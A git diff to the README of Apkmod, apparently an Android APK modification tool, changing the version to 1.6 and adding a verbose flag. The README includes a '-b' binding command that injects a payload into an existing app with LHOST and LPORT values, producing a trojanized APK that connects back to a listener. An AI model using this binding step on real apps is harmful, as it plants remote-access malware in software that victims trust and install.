@@ -1,4 +1,4 @@
-# Apkmod v1.5
+# Apkmod v1.6
 ### Author : Lokesh @Hax4us
 
 ## _Steps For Installation_
@@ -12,7 +12,8 @@
 2. For recompiling `apkmod -r /path/to/indirectory -o /path/to/outapp.apk`. It will recompile __indirectory__ ( where decompiled files are exists ) into __outapp.apk__.
 3. For signing `apkmod -s /path/to/unsignedapp.apk -o /path/to/signedapp.apk`. It will sign __unsignedapp.apk__ and saves output ( signed app ) to __signedapp.apk__.
 4. For binding `apkmod -b /path/to/originalApp.apk -o /path/to/binded.apk LHOST=127.0.0.1 LPORT=4444`. It will bind payload with __originalApp.apk__ and saves final binded app to __binded.apk__.
-5. Now you can use a optional option `-a` to use __aapt2__ for __binding__ and __recompiling__. Why aapt2 ? Because some apps can't recompile with __aapt__ but __aapt2__ can do it. But I can't drop __aapt__ support because some apps can't recompile with __aapt2__ so first recompile or bind without __aapt2__ ( `-a` ) then if you failed then try with __aapt2__. For example `apkmod -a -b /path/to/originalApp.apk -o /path/to/binded.apk LHOST=127.0.0.1 LPORT=4444`. 
+5. Now you can use a optional option `-a` to use __aapt2__ for __binding__ and __recompiling__. Why aapt2 ? Because some apps can't recompile with __aapt__ but __aapt2__ can do it. But I can't drop __aapt__ support because some apps can't recompile with __aapt2__ so first recompile or bind without __aapt2__ ( `-a` ) then if you failed then try with __aapt2__. For example `apkmod -a -b /path/to/originalApp.apk -o /path/to/binded.apk LHOST=127.0.0.1 LPORT=4444`.
+6. Use `-V` to enable verbose output 
 
 ### Size Comparision
 Size  | Apkmod  | Third party tools
